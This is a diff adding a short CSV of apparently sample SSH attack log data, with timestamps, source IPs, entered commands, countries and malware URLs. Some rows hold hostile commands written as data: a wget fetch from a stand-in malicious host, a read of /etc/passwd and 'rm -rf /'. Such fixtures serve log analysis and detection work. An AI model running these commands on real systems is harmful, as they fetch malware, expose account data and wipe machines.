@@ -1,0 +1,6 @@
+timestamp,src_ip,command,protocol,country,success,malware_url
+2025-06-01 10:00,45.33.12.1,ls,ssh,CN,0,
+2025-06-01 10:01,109.76.3.22,wget bad.com/mal.sh,ssh,RU,1,http://bad.com/mal.sh
+2025-06-01 11:03,192.168.1.101,cat /etc/passwd,ssh,US,0,
+2025-06-01 12:30,172.16.2.4,ping 8.8.8.8,ssh,CN,0,
+2025-06-01 13:20,203.0.113.88,rm -rf /,ssh,IR,1,http://evil.ir/script.sh
